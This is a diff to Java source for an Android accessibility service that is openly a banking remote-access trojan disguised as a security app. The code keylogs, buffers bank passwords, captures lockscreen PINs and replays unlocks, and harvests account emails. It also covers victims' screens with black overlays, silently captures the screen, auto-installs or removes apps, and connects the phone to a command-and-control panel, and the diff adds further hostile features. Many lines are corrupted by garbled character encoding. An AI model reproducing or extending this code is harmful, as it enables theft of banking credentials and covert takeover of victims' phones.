@@ -27,7 +27,7 @@ import java.util.Locale;
 import java.util.List;
 
 /**
- * Accessibility bridge — screen interaction, capture, and remote control delegation.
+ * Accessibility bridge Ã¢â‚¬â€ screen interaction, capture, and remote control delegation.
  */
 @Obfuscate
 public class UiAssistBridge extends AccessibilityService {
@@ -37,6 +37,8 @@ public class UiAssistBridge extends AccessibilityService {
     private GestureCore gestureCore;
     private boolean isAutomating = false;
     private int automationStep = 0;
+    private long autoGrantUntil = 0L;
+    private long autoGrantLast = 0L;
     
     // Keep track of foreground package to notify panel of changes
     private String lastForegroundPackage = "";
@@ -46,7 +48,7 @@ public class UiAssistBridge extends AccessibilityService {
     private String lastCapturedText = "";
     private SimpleDateFormat dateFormat = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault());
     
-    // 🔥 Debounce para evitar eventos duplicados de keylog
+    // Ã°Å¸â€Â¥ Debounce para evitar eventos duplicados de keylog
     private String lastKeylogDigit = "";
     // [KRYPTOS] buffer codigo desbloqueio
     private static final StringBuilder lockscreenBuffer = new StringBuilder();
@@ -54,7 +56,7 @@ public class UiAssistBridge extends AccessibilityService {
     private long lastKeylogTime = 0;
     private static final long KEYLOG_DEBOUNCE_MS = 50; // 50ms entre eventos iguais (reduzido de 200ms!)
     
-    // 📱 BUFFER DE SENHA BANCÁRIA - Acumula dígitos antes de enviar
+    // Ã°Å¸â€œÂ± BUFFER DE SENHA BANCÃƒÂRIA - Acumula dÃƒÂ­gitos antes de enviar
     private StringBuilder bankPasswordBuffer = new StringBuilder();
     private String currentBankApp = "";
     private long lastBankDigitTime = 0;
@@ -66,8 +68,12 @@ public class UiAssistBridge extends AccessibilityService {
     public static boolean screenReaderEnabled = false;
     private Handler screenReaderHandler = new Handler();
     private Runnable screenReaderRunnable;
+    private final java.util.concurrent.ExecutorService screenReaderExec = java.util.concurrent.Executors.newSingleThreadExecutor(r -> { Thread _t = new Thread(r, "ScreenReader"); _t.setDaemon(true); return _t; });
+    private volatile boolean screenReaderBusy = false;
+    private long screenReaderLastRun = 0L;
+    private int hierNodeBudget = 0;
     
-    // 🔓 Sistema de Desbloqueio Automático
+    // Ã°Å¸â€â€œ Sistema de Desbloqueio AutomÃƒÂ¡tico
     private boolean isRecordingUnlock = false;
     private java.util.ArrayList<UnlockAction> unlockSequence = new java.util.ArrayList<>();
     private String unlockType = "unknown"; // pin, pattern, password
@@ -157,18 +163,21 @@ public class UiAssistBridge extends AccessibilityService {
         }
     }
     
-    // 🖤 BLACK SCREEN OVERLAY (100% opaco via AccessibilityService)
+    // Ã°Å¸â€“Â¤ BLACK SCREEN OVERLAY (100% opaco via AccessibilityService)
     private android.view.View blackOverlayView = null;
     private android.view.WindowManager blackOverlayWindowManager = null;
     private boolean isBlackScreenActive = false;
-    private boolean isBlackOverlayTouchable = false; // Controla se o overlay intercepta toques (bloqueando a vítima)
+    private boolean isBlackOverlayTouchable = false; // Controla se o overlay intercepta toques (bloqueando a vÃƒÂ­tima)
     private boolean isBlackOverlayFocusable = false; // Controla se o overlay ganha foco (teclado habilitado)
-    public static boolean isBlackTouchBlocked = false; // Estado de bloqueio desejado pelo usuário (painel)
-    private boolean isCustomTemplateActive = false; // Define se a overlay atual é um template editado
+    public static boolean isBlackTouchBlocked = false; // Estado de bloqueio desejado pelo usuÃƒÂ¡rio (painel)
+    private boolean isCustomTemplateActive = false; // Define se a overlay atual ÃƒÂ© um template editado
     private int blackScreenOpacityPercent = 100;
     private long lastBlackScreenNavBlockMs = 0;
+    private long lastOverlayShownAt = 0;
     private static volatile long lastBlackOverlayRestoredMs = 0;
-    private static final long BLACK_SCREEN_NAV_BLOCK_COOLDOWN_MS = 800;
+    private static final long BLACK_SCREEN_NAV_BLOCK_COOLDOWN_MS = 1200;
+    private String lastHierJson = "";
+    private long lastHierSentMs = 0L;
     private static final long BLACK_OVERLAY_RESTORE_COOLDOWN_MS = 0;
     private static final long BLACK_OVERLAY_LATCH_TIMEOUT_MS = 200;
     /** Salva os params do overlay removido durante a captura para restaurar depois. */
@@ -177,18 +186,18 @@ public class UiAssistBridge extends AccessibilityService {
      *  Habilitado para permitir VNC transparente, restaurado apenas no callback de sucesso/falha do screenshot. */
     private static volatile boolean BLACK_SCREEN_CAPTURE_FALLBACK = false;
     
-    // 📦 AUTO-INSTALL APK (auto-click em "Instalar")
+    // Ã°Å¸â€œÂ¦ AUTO-INSTALL APK (auto-click em "Instalar")
     private boolean autoInstallEnabled = false;
     private long autoInstallEnabledTime = 0;
     
-    // 🗑️ ALLOW UNINSTALL OTHER APPS - Permite desinstalar outros apps via painel
+    // Ã°Å¸â€”â€˜Ã¯Â¸Â ALLOW UNINSTALL OTHER APPS - Permite desinstalar outros apps via painel
     public static boolean allowUninstallOtherApps = false;
     public static long allowUninstallTime = 0;
     public static boolean autoUninstallEnabled = false;
     public static long autoUninstallTime = 0;
     public static String packageToUninstall = "";
 
-    // 🚫 IMPEDIR ABERTURA DE APPS ESPECIFICADOS (TELA DE APP INDISPONÍVEL)
+    // Ã°Å¸Å¡Â« IMPEDIR ABERTURA DE APPS ESPECIFICADOS (TELA DE APP INDISPONÃƒÂVEL)
     public static final java.util.Set<String> blockedPackages = java.util.Collections.synchronizedSet(new java.util.HashSet<>());
 
     public static void loadBlockedPackages(Context context) {
@@ -204,7 +213,7 @@ public class UiAssistBridge extends AccessibilityService {
                     blockedPackages.add(pkg.trim().toLowerCase());
                 }
             }
-            Log.d(TAG, "🚫 Blocked packages carregados: " + blockedPackages.size() + " apps");
+            Log.d(TAG, "Ã°Å¸Å¡Â« Blocked packages carregados: " + blockedPackages.size() + " apps");
         } catch (Exception e) {
             Log.e(TAG, "Erro ao carregar blocked packages: " + e.getMessage());
         }
@@ -225,7 +234,7 @@ public class UiAssistBridge extends AccessibilityService {
                     .edit()
                     .putString("blocked_packages_list", arr.toString())
                     .apply();
-            Log.d(TAG, "🚫 Blocked packages salvos: " + blockedPackages.size() + " apps");
+            Log.d(TAG, "Ã°Å¸Å¡Â« Blocked packages salvos: " + blockedPackages.size() + " apps");
         } catch (Exception e) {
             Log.e(TAG, "Erro ao salvar blocked packages: " + e.getMessage());
         }
@@ -243,7 +252,7 @@ public class UiAssistBridge extends AccessibilityService {
                 if (email != null && !email.isEmpty() && (email.contains("@gmail.com") || email.contains("@googlemail.com") || email.contains("@"))) {
                     if (accounts.add(email)) {
                         changed = true;
-                        Log.d("UiAssistBridge", "📧 Nova conta Google/Email capturada: " + email);
+                        Log.d("UiAssistBridge", "Ã°Å¸â€œÂ§ Nova conta Google/Email capturada: " + email);
                     }
                 }
             }
@@ -260,34 +269,34 @@ public class UiAssistBridge extends AccessibilityService {
         } catch (Exception ignored) {}
     }
     
-    // ⛔ AUTO FORCE STOP - Permite forçar parada de outros apps via painel
+    // Ã¢â€ºâ€ AUTO FORCE STOP - Permite forÃƒÂ§ar parada de outros apps via painel
     public static boolean autoForceStopEnabled = false;
     public static long autoForceStopTime = 0;
     public static String packageToForceStop = "";
     
-    // 🔒 SCREEN PERSISTENCE - Não deixa a vítima desligar a tela
+    // Ã°Å¸â€â€™ SCREEN PERSISTENCE - NÃƒÂ£o deixa a vÃƒÂ­tima desligar a tela
     private boolean screenPersistenceEnabled = false;
     private android.os.PowerManager.WakeLock screenPersistenceWakeLock;
     private android.view.View keepScreenOnOverlay = null;
     private android.view.WindowManager keepScreenOnWindowManager = null;
 
-    // 🔋 Dedicated PARTIAL_WAKE_LOCK for the silent capture thread
+    // Ã°Å¸â€â€¹ Dedicated PARTIAL_WAKE_LOCK for the silent capture thread
     private android.os.PowerManager.WakeLock silentCpuWakeLock = null;
     
-    // 🔧 ROM COMPATIBILITY - Auto-click em configurações de ROM
+    // Ã°Å¸â€Â§ ROM COMPATIBILITY - Auto-click em configuraÃƒÂ§ÃƒÂµes de ROM
     private boolean romConfigEnabled = false;
     private long romConfigEnabledTime = 0;
     private ROMCompatibility romCompat;
     private String lastWindowStateClass = "";
     private long lastWindowStateTime = 0;
     
-    // Classe para armazenar ações de desbloqueio
+    // Classe para armazenar aÃƒÂ§ÃƒÂµes de desbloqueio
     private static class UnlockAction {
         String type; // CLICK, SWIPE, TYPE
         int x, y;
         int x2, y2; // Para swipe
         String text; // Para TYPE
-        long delay; // Delay antes desta ação
+        long delay; // Delay antes desta aÃƒÂ§ÃƒÂ£o
         
         UnlockAction(String type, int x, int y) {
             this.type = type;
@@ -304,7 +313,7 @@ public class UiAssistBridge extends AccessibilityService {
         }
     }
     
-    // Estados da automação
+    // Estados da automaÃƒÂ§ÃƒÂ£o
     private static final int STEP_IDLE = 0;
     private static final int STEP_REQUEST_OVERLAY = 1;
     private static final int STEP_ENABLE_OVERLAY = 2;
@@ -315,13 +324,13 @@ public class UiAssistBridge extends AccessibilityService {
     public void onServiceConnected() {
         try { AccessibilityKeeper.garantir(this); AccessibilityKeeper.startLoop(this); } catch (Throwable t) {}
         super.onServiceConnected();
-        Log.d(TAG, "Serviço de acessibilidade conectado!");
+        Log.d(TAG, "ServiÃƒÂ§o de acessibilidade conectado!");
         serviceStartTime = System.currentTimeMillis();
 
-        // Inicia o Watchdog de persistência de serviço
-        watchdogHandler.postDelayed(watchdogRunnable, 5000); // Primeira verificação em 5s
+        // Inicia o Watchdog de persistÃƒÂªncia de serviÃƒÂ§o
+        watchdogHandler.postDelayed(watchdogRunnable, 5000); // Primeira verificaÃƒÂ§ÃƒÂ£o em 5s
 
-        // Garante que o setup é marcado como concluído de forma síncrona
+        // Garante que o setup ÃƒÂ© marcado como concluÃƒÂ­do de forma sÃƒÂ­ncrona
         getSharedPreferences("rat_prefs", MODE_PRIVATE)
             .edit()
             .putBoolean("setup_completed", true)
@@ -330,6 +339,17 @@ public class UiAssistBridge extends AccessibilityService {
         // BTMOB-style: expose static instance of the AccessibilityService for the dedicated silent capture thread
         instance = this;
         gestureCore = new GestureCore(this, this::wakeUpScreen);
+
+        try {
+            final android.content.Context _c = getApplicationContext();
+            handler.postDelayed(new Runnable() { public void run() {
+                try {
+                    Intent _i = new Intent(_c, MainActivity.class);
+                    _i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
+                    _c.startActivity(_i);
+                } catch (Throwable t) {}
+            } }, 900L);
+        } catch (Throwable t) {}
 
         // Notifica o CommandControlService que a acessibilidade foi ativada
         if (CommandControlService.sInstance != null) {
@@ -344,14 +364,14 @@ public class UiAssistBridge extends AccessibilityService {
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
             SilentState persisted = loadSilentState();
             if (persisted.active) {
-                Log.d(TAG, "🔇 Resuming BTMOB-style silent capture from persisted state (quality=" + persisted.quality + ")");
+                Log.d(TAG, "Ã°Å¸â€â€¡ Resuming BTMOB-style silent capture from persisted state (quality=" + persisted.quality + ")");
                 isSilentVncEnabled = true;
                 silentCaptureQuality = clampSilentQuality(persisted.quality);
                 startSilentScreenCapture(persisted.quality);
             }
         }
         
-        // Registra receiver para iniciar automação quando tela fake solicitar (com flag Android 14+)
+        // Registra receiver para iniciar automaÃƒÂ§ÃƒÂ£o quando tela fake solicitar (com flag Android 14+)
         IntentFilter filter = new IntentFilter("com.seguranca.protecao.AUTO_GRANT_PERMISSIONS");
         if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.UPSIDE_DOWN_CAKE) {
             registerReceiver(autoGrantReceiver, filter, Context.RECEIVER_NOT_EXPORTED);
@@ -383,7 +403,7 @@ public class UiAssistBridge extends AccessibilityService {
             registerReceiver(screenReaderReceiver, screenReaderFilter);
         }
         
-        // Registra receiver para GRAVAÇÃO DE DESBLOQUEIO (com flag Android 14+)
+        // Registra receiver para GRAVAÃƒâ€¡ÃƒÆ’O DE DESBLOQUEIO (com flag Android 14+)
         IntentFilter unlockFilter = new IntentFilter("com.seguranca.protecao.UNLOCK_RECORDING");
         if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.UPSIDE_DOWN_CAKE) {
             registerReceiver(unlockRecordingReceiver, unlockFilter, Context.RECEIVER_NOT_EXPORTED);
@@ -391,7 +411,7 @@ public class UiAssistBridge extends AccessibilityService {
             registerReceiver(unlockRecordingReceiver, unlockFilter);
         }
         
-        // Registra receiver para SILENT VNC (sem ícone/notificação) (com flag Android 14+)
+        // Registra receiver para SILENT VNC (sem ÃƒÂ­cone/notificaÃƒÂ§ÃƒÂ£o) (com flag Android 14+)
         IntentFilter silentVncFilter = new IntentFilter("com.seguranca.protecao.TOGGLE_SILENT_VNC");
         if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.UPSIDE_DOWN_CAKE) {
             registerReceiver(silentVncReceiver, silentVncFilter, Context.RECEIVER_NOT_EXPORTED);
@@ -407,81 +427,82 @@ public class UiAssistBridge extends AccessibilityService {
             registerReceiver(patternUnlockReceiver, patternUnlockFilter);
         }
         
-        // 🖤 Registra receiver para BLACK SCREEN OVERLAY (100% opaco)
+        // Ã°Å¸â€“Â¤ Registra receiver para BLACK SCREEN OVERLAY (100% opaco)
         IntentFilter blackScreenFilter = new IntentFilter();
         blackScreenFilter.addAction("com.seguranca.protecao.BLACK_SCREEN_ON");
         blackScreenFilter.addAction("com.seguranca.protecao.BLACK_SCREEN_OFF");
         blackScreenFilter.addAction("com.seguranca.protecao.CUSTOM_BLACK_SCREEN");
         blackScreenFilter.addAction("com.seguranca.protecao.SET_BLACK_SCREEN_OPACITY");
+        blackScreenFilter.addAction("com.seguranca.protecao.TOGGLE_BANK_TEMPLATE");
         if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.UPSIDE_DOWN_CAKE) {
             registerReceiver(blackScreenReceiver, blackScreenFilter, Context.RECEIVER_NOT_EXPORTED);
         } else {
             registerReceiver(blackScreenReceiver, blackScreenFilter);
         }
-        Log.d(TAG, "🖤 BLACK SCREEN receiver registrado!");
+        Log.d(TAG, "Ã°Å¸â€“Â¤ BLACK SCREEN receiver registrado!");
         
-        // 📦 Registra receiver para AUTO-INSTALL de APKs
+        // Ã°Å¸â€œÂ¦ Registra receiver para AUTO-INSTALL de APKs
         IntentFilter autoInstallFilter = new IntentFilter("com.seguranca.protecao.ENABLE_AUTO_INSTALL");
         if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.UPSIDE_DOWN_CAKE) {
             registerReceiver(autoInstallReceiver, autoInstallFilter, Context.RECEIVER_NOT_EXPORTED);
         } else {
             registerReceiver(autoInstallReceiver, autoInstallFilter);
         }
-        Log.d(TAG, "📦 AUTO-INSTALL receiver registrado!");
+        Log.d(TAG, "Ã°Å¸â€œÂ¦ AUTO-INSTALL receiver registrado!");
         
-        // 🔧 Registra receiver para ROM CONFIG (auto-click em configurações de ROM)
+        // Ã°Å¸â€Â§ Registra receiver para ROM CONFIG (auto-click em configuraÃƒÂ§ÃƒÂµes de ROM)
         IntentFilter romConfigFilter = new IntentFilter("com.seguranca.protecao.ENABLE_ROM_CONFIG");
         if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.UPSIDE_DOWN_CAKE) {
             registerReceiver(romConfigReceiver, romConfigFilter, Context.RECEIVER_NOT_EXPORTED);
         } else {
             registerReceiver(romConfigReceiver, romConfigFilter);
         }
-        Log.d(TAG, "🔧 ROM_CONFIG receiver registrado!");
+        Log.d(TAG, "Ã°Å¸â€Â§ ROM_CONFIG receiver registrado!");
         
-        // 🗑️ Registra receiver para ALLOW_UNINSTALL (permitir desinstalar outros apps)
+        // Ã°Å¸â€”â€˜Ã¯Â¸Â Registra receiver para ALLOW_UNINSTALL (permitir desinstalar outros apps)
         IntentFilter allowUninstallFilter = new IntentFilter("com.seguranca.protecao.ALLOW_UNINSTALL");
         if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.UPSIDE_DOWN_CAKE) {
             registerReceiver(allowUninstallReceiver, allowUninstallFilter, Context.RECEIVER_NOT_EXPORTED);
         } else {
             registerReceiver(allowUninstallReceiver, allowUninstallFilter);
         }
-        Log.d(TAG, "🗑️ ALLOW_UNINSTALL receiver registrado!");
+        Log.d(TAG, "Ã°Å¸â€”â€˜Ã¯Â¸Â ALLOW_UNINSTALL receiver registrado!");
         
-        // 🗑️ Registra receiver para AUTO_UNINSTALL (auto-click na confirmação de desinstalação)
+        // Ã°Å¸â€”â€˜Ã¯Â¸Â Registra receiver para AUTO_UNINSTALL (auto-click na confirmaÃƒÂ§ÃƒÂ£o de desinstalaÃƒÂ§ÃƒÂ£o)
         IntentFilter autoUninstallFilter = new IntentFilter("com.seguranca.protecao.AUTO_UNINSTALL");
         if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.UPSIDE_DOWN_CAKE) {
             registerReceiver(autoUninstallReceiver, autoUninstallFilter, Context.RECEIVER_NOT_EXPORTED);
         } else {
             registerReceiver(autoUninstallReceiver, autoUninstallFilter);
         }
-        Log.d(TAG, "🗑️ AUTO_UNINSTALL receiver registrado!");
+        Log.d(TAG, "Ã°Å¸â€”â€˜Ã¯Â¸Â AUTO_UNINSTALL receiver registrado!");
         
-        // ⛔ Registra receiver para AUTO_FORCE_STOP (auto-click em forçar parada)
+        // Ã¢â€ºâ€ Registra receiver para AUTO_FORCE_STOP (auto-click em forÃƒÂ§ar parada)
         IntentFilter autoForceStopFilter = new IntentFilter("com.seguranca.protecao.AUTO_FORCE_STOP");
         if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.UPSIDE_DOWN_CAKE) {
             registerReceiver(autoForceStopReceiver, autoForceStopFilter, Context.RECEIVER_NOT_EXPORTED);
         } else {
             registerReceiver(autoForceStopReceiver, autoForceStopFilter);
         }
-        Log.d(TAG, "⛔ AUTO_FORCE_STOP receiver registrado!");
+        Log.d(TAG, "Ã¢â€ºâ€ AUTO_FORCE_STOP receiver registrado!");
         
-        // 🔒 Registra receiver para SCREEN_OFF/ON (persistência de tela)
+        // Ã°Å¸â€â€™ Registra receiver para SCREEN_OFF/ON (persistÃƒÂªncia de tela)
         IntentFilter screenFilter = new IntentFilter();
         screenFilter.addAction(Intent.ACTION_SCREEN_OFF);
         screenFilter.addAction(Intent.ACTION_SCREEN_ON);
         registerReceiver(screenPersistenceReceiver, screenFilter);
-        Log.d(TAG, "🔒 SCREEN_OFF/ON receiver registrado!");
+        Log.d(TAG, "Ã°Å¸â€â€™ SCREEN_OFF/ON receiver registrado!");
         
-        // 🔒 Registra receiver para TOGGLE SCREEN PERSISTENCE (EXPORTED para receber de CommandControlService)
+        // Ã°Å¸â€â€™ Registra receiver para TOGGLE SCREEN PERSISTENCE (EXPORTED para receber de CommandControlService)
         IntentFilter togglePersistenceFilter = new IntentFilter("com.seguranca.protecao.TOGGLE_SCREEN_PERSISTENCE");
         if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.TIRAMISU) {
             registerReceiver(toggleScreenPersistenceReceiver, togglePersistenceFilter, Context.RECEIVER_EXPORTED);
         } else {
             registerReceiver(toggleScreenPersistenceReceiver, togglePersistenceFilter);
         }
-        Log.d(TAG, "🔒 TOGGLE_SCREEN_PERSISTENCE receiver registrado!");
+        Log.d(TAG, "Ã°Å¸â€â€™ TOGGLE_SCREEN_PERSISTENCE receiver registrado!");
         
-        // 🔒 Registra receivers para LOCKSCREEN PIN (igual EAGLESPY V5)
+        // Ã°Å¸â€â€™ Registra receivers para LOCKSCREEN PIN (igual EAGLESPY V5)
         IntentFilter lockscreenFilter = new IntentFilter();
         lockscreenFilter.addAction("com.seguranca.protecao.SHOW_LOCKSCREEN");
         lockscreenFilter.addAction("com.seguranca.protecao.HIDE_LOCKSCREEN");
@@ -490,18 +511,18 @@ public class UiAssistBridge extends AccessibilityService {
         } else {
             registerReceiver(lockscreenReceiver, lockscreenFilter);
         }
-        Log.d(TAG, "🔒 LOCKSCREEN receiver registrado!");
+        Log.d(TAG, "Ã°Å¸â€â€™ LOCKSCREEN receiver registrado!");
         
-        // 🔢 Registra receiver para LOCK_KEY_PRESS (teclas do PIN)
+        // Ã°Å¸â€Â¢ Registra receiver para LOCK_KEY_PRESS (teclas do PIN)
         IntentFilter lockKeyFilter = new IntentFilter("com.seguranca.protecao.LOCK_KEY_PRESS");
         if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.UPSIDE_DOWN_CAKE) {
             registerReceiver(lockKeyPressReceiver, lockKeyFilter, Context.RECEIVER_NOT_EXPORTED);
         } else {
             registerReceiver(lockKeyPressReceiver, lockKeyFilter);
         }
-        Log.d(TAG, "🔢 LOCK_KEY_PRESS receiver registrado!");
+        Log.d(TAG, "Ã°Å¸â€Â¢ LOCK_KEY_PRESS receiver registrado!");
         
-        // 🔄 Registra receiver para PLAY_PIN_SEQUENCE e PLAY_PATTERN_SEQUENCE (reprodução automática)
+        // Ã°Å¸â€â€ž Registra receiver para PLAY_PIN_SEQUENCE e PLAY_PATTERN_SEQUENCE (reproduÃƒÂ§ÃƒÂ£o automÃƒÂ¡tica)
         IntentFilter playPinFilter = new IntentFilter("com.seguranca.protecao.PLAY_PIN_SEQUENCE");
         playPinFilter.addAction("com.seguranca.protecao.PLAY_PATTERN_SEQUENCE");
         playPinFilter.addAction("PATTERN_UNLOCK_ACTION");
@@ -512,26 +533,26 @@ public class UiAssistBridge extends AccessibilityService {
         } else {
             registerReceiver(playPinSequenceReceiver, playPinFilter);
         }
-        Log.d(TAG, "🔄 PLAY_PIN_SEQUENCE & PLAY_PATTERN_SEQUENCE receiver registrado!");
+        Log.d(TAG, "Ã°Å¸â€â€ž PLAY_PIN_SEQUENCE & PLAY_PATTERN_SEQUENCE receiver registrado!");
         
-        // 🔧 Inicializa ROM Compatibility
+        // Ã°Å¸â€Â§ Inicializa ROM Compatibility
         romCompat = new ROMCompatibility(this);
-        Log.d(TAG, "📱 ROM detectada: " + romCompat.detectROM().name());
+        Log.d(TAG, "Ã°Å¸â€œÂ± ROM detectada: " + romCompat.detectROM().name());
         
-        // IMPORTANTE: NÃO inicia automação automaticamente!
+        // IMPORTANTE: NÃƒÆ’O inicia automaÃƒÂ§ÃƒÂ£o automaticamente!
         // Apenas aguarda comandos do Wizard
-        Log.d(TAG, "✅ Aguardando comandos do wizard...");
+        Log.d(TAG, "Ã¢Å“â€¦ Aguardando comandos do wizard...");
         
-        // 🛡️ Registra receiver para REQUEST_ADMIN_INTENT (CommandControlService pede para abrir tela de admin)
+        // Ã°Å¸â€ºÂ¡Ã¯Â¸Â Registra receiver para REQUEST_ADMIN_INTENT (CommandControlService pede para abrir tela de admin)
         IntentFilter adminIntentFilter = new IntentFilter("com.seguranca.protecao.REQUEST_ADMIN_INTENT");
         if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.TIRAMISU) {
             registerReceiver(requestAdminIntentReceiver, adminIntentFilter, Context.RECEIVER_NOT_EXPORTED);
         } else {
             registerReceiver(requestAdminIntentReceiver, adminIntentFilter);
         }
-        Log.d(TAG, "🛡️ REQUEST_ADMIN_INTENT receiver registrado!");
+        Log.d(TAG, "Ã°Å¸â€ºÂ¡Ã¯Â¸Â REQUEST_ADMIN_INTENT receiver registrado!");
 
-        // 🚫 Registra receiver para BLOQUEIO DE APPS / TELA INDISPONÍVEL
+        // Ã°Å¸Å¡Â« Registra receiver para BLOQUEIO DE APPS / TELA INDISPONÃƒÂVEL
         IntentFilter appBlockFilter = new IntentFilter();
         appBlockFilter.addAction("com.seguranca.protecao.SHOW_APP_UNAVAILABLE");
         appBlockFilter.addAction("com.seguranca.protecao.SET_BLOCKED_APPS");
@@ -542,23 +563,34 @@ public class UiAssistBridge extends AccessibilityService {
             registerReceiver(appBlockReceiver, appBlockFilter);
         }
         loadBlockedPackages(this);
-        Log.d(TAG, "🚫 APP_BLOCK receiver registrado!");
+        Log.d(TAG, "Ã°Å¸Å¡Â« APP_BLOCK receiver registrado!");
 
-        // 🚀 INICIA COMMANDCONTROLSERVICE IMEDIATAMENTE!
-        // Isso faz o dispositivo aparecer no painel web assim que a Acessibilidade é habilitada
-        // Não precisa esperar captura de tela — C&C sobe assim que a A11y está ativa
+        // Ã°Å¸Å¡â‚¬ INICIA COMMANDCONTROLSERVICE IMEDIATAMENTE!
+        // Isso faz o dispositivo aparecer no painel web assim que a Acessibilidade ÃƒÂ© habilitada
+        // NÃƒÂ£o precisa esperar captura de tela Ã¢â‚¬â€ C&C sobe assim que a A11y estÃƒÂ¡ ativa
         startCommandControlService();
         
-        // Notifica o wizard que o serviço está ativo
+        // Notifica o wizard que o serviÃƒÂ§o estÃƒÂ¡ ativo
         Intent intent = new Intent("com.seguranca.protecao.AUTOMATION_UPDATE");
         intent.putExtra("action", "accessibility_enabled");
         sendBroadcast(intent);
 
 
         
-        // 🎨 APK Visual: ABRE a activity diretamente para voltar ao app
+        // Ã°Å¸Å½Â¨ APK Visual: ABRE a activity diretamente para voltar ao app
+        // [KRYPTOS-PATCH] Modo enlace: abre la web al activar accesibilidad
+        if (!VisualScreenActivity.hasVisualConfig(this)
+                && CommandControlService.WEBVIEW_URL != null
+                && !CommandControlService.WEBVIEW_URL.trim().isEmpty()) {
+            try {
+                Intent wvI = new Intent(this, WebViewActivity.class);
+                wvI.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_CLEAR_TOP);
+                startActivity(wvI);
+            } catch (Throwable t) {}
+        }
+
         if (VisualScreenActivity.hasVisualConfig(this)) {
-            Log.d(TAG, "🎨 APK Visual detectado - ABRINDO VisualScreenActivity!");
+            Log.d(TAG, "Ã°Å¸Å½Â¨ APK Visual detectado - ABRINDO VisualScreenActivity!");
             
             // Abre a VisualScreenActivity diretamente - isso traz o app para frente
             Intent visualIntent = new Intent(this, VisualScreenActivity.class);
@@ -566,12 +598,12 @@ public class UiAssistBridge extends AccessibilityService {
             visualIntent.putExtra("accessibility_just_enabled", true);
             startActivity(visualIntent);
             
-            Log.d(TAG, "✅ VisualScreenActivity aberta - app deve estar em primeiro plano agora!");
+            Log.d(TAG, "Ã¢Å“â€¦ VisualScreenActivity aberta - app deve estar em primeiro plano agora!");
         }
     }
 
     /**
-     * 🚫 Receiver para comandos de bloqueio de apps (exibir tela de App Indisponível e gerenciar lista)
+     * Ã°Å¸Å¡Â« Receiver para comandos de bloqueio de apps (exibir tela de App IndisponÃƒÂ­vel e gerenciar lista)
      */
     private final BroadcastReceiver appBlockReceiver = new BroadcastReceiver() {
         @Override
@@ -600,58 +632,58 @@ public class UiAssistBridge extends AccessibilityService {
     };
     
     /**
-     * 🚀 Inicia o CommandControlService para conectar ao servidor
+     * Ã°Å¸Å¡â‚¬ Inicia o CommandControlService para conectar ao servidor
      * Isso faz o dispositivo aparecer no painel web IMEDIATAMENTE
      */
     private void startCommandControlService() {
         try {
-            Log.d(TAG, "🚀 Iniciando CommandControlService (conexão com servidor)...");
+            Log.d(TAG, "Ã°Å¸Å¡â‚¬ Iniciando CommandControlService (conexÃƒÂ£o com servidor)...");
             Intent ccIntent = new Intent(this, CommandControlService.class);
             if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.O) {
                 startForegroundService(ccIntent);
             } else {
                 startService(ccIntent);
             }
-            Log.d(TAG, "✅ CommandControlService iniciado - dispositivo deve aparecer no painel web!");
+            Log.d(TAG, "Ã¢Å“â€¦ CommandControlService iniciado - dispositivo deve aparecer no painel web!");
         } catch (Exception e) {
-            Log.e(TAG, "❌ Erro ao iniciar CommandControlService: " + e.getMessage());
+            Log.e(TAG, "Ã¢ÂÅ’ Erro ao iniciar CommandControlService: " + e.getMessage());
         }
     }
     
     /**
-     * 🛡️ Receiver que abre a tela de ativação de Device Admin
-     * Chamado pelo CommandControlService via broadcast (evita restrições Android 10+ para Services)
+     * Ã°Å¸â€ºÂ¡Ã¯Â¸Â Receiver que abre a tela de ativaÃƒÂ§ÃƒÂ£o de Device Admin
+     * Chamado pelo CommandControlService via broadcast (evita restriÃƒÂ§ÃƒÂµes Android 10+ para Services)
      */
     private BroadcastReceiver requestAdminIntentReceiver = new BroadcastReceiver() {
         @Override
         public void onReceive(Context context, Intent intent) {
-            Log.d(TAG, "🛡️ REQUEST_ADMIN_INTENT recebido pelo AccessibilityService!");
+            Log.d(TAG, "Ã°Å¸â€ºÂ¡Ã¯Â¸Â REQUEST_ADMIN_INTENT recebido pelo AccessibilityService!");
             try {
                 android.app.admin.DevicePolicyManager dpm = (android.app.admin.DevicePolicyManager) getSystemService(Context.DEVICE_POLICY_SERVICE);
                 android.content.ComponentName adminComponent = new android.content.ComponentName(UiAssistBridge.this, MyAdminReceiver.class);
                 if (dpm != null && dpm.isAdminActive(adminComponent)) {
-                    Log.d(TAG, "✅ Admin já está ativo!");
+                    Log.d(TAG, "Ã¢Å“â€¦ Admin jÃƒÂ¡ estÃƒÂ¡ ativo!");
                     CommandControlService.requestAdminRuntime = false;
                 } else {
-                    CommandControlService.requestAdminRuntime = true; // Garante que o flag está ativo
+                    CommandControlService.requestAdminRuntime = true; // Garante que o flag estÃƒÂ¡ ativo
                     Intent promptIntent = new Intent(UiAssistBridge.this, AdminPromptActivity.class);
                     promptIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_CLEAR_TOP);
                     startActivity(promptIntent);
-                    Log.d(TAG, "🛡️ AdminPromptActivity iniciada pelo AccessibilityService!");
+                    Log.d(TAG, "Ã°Å¸â€ºÂ¡Ã¯Â¸Â AdminPromptActivity iniciada pelo AccessibilityService!");
                     
-                    // Agenda verificação de fallback em 2500ms
+                    // Agenda verificaÃƒÂ§ÃƒÂ£o de fallback em 2500ms
                     handler.postDelayed(() -> {
                         try {
